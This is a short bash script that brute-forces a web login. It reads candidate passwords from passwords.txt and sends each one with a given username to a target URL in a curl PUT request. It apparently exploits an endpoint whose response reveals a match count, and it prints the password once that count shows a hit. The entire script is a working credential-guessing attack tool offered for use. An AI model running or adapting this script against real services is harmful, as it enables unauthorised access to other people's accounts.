#!/bin/bash
#
#   Author: Kyle Dixon
#   Description:
#   Sources: https://curl.haxx.se/docs/manpage.html#-v 
#           https://linuxhint.com/curl_bash_examples/
#           https://linuxize.com/post/curl-command-examples/
#           https://www.rosehosting.com/blog/curl-command-examples/



#Test Function
function test() {
    res=$(curl --silent --request PUT "${2}" --data "user_name=${3}&user_pass=${1}")    #Send PUT which takes over login check, res = [{"total":1}] or [{"total":0}]
    check=$(echo $res | cut -c11-11)        #Get just the value, the 11th character
    if [[ "$check" == "1" ]]; then          #Check for a match
        echo -e "\e[38;5;198m[+] Match Found \e[0m"
        printf '[+] Password == %s\n' "$1"               #print matching password and exit
        exit 1
    fi
}

#Curl Authentication function
function curlAuth() {
    url="${1}"
    username="${2}"
    input="passwords.txt"
    echo "[*] Testing combinations..." 
    while IFS= read -r line      #Read through the file line by line
    do 
        test "${line}" "${url}" "${username}"
    done <"${input}"
    echo -e "\e[38;5;198m[-] No Match Found \e[0m"
    exit 1
}

#Main function
if [ "${1}" = "-g" ]
then
    curlAuth "${3}" "${2}"
else
    echo "[*] Usage: -g + username + url"
    exit 1
fi
exit 0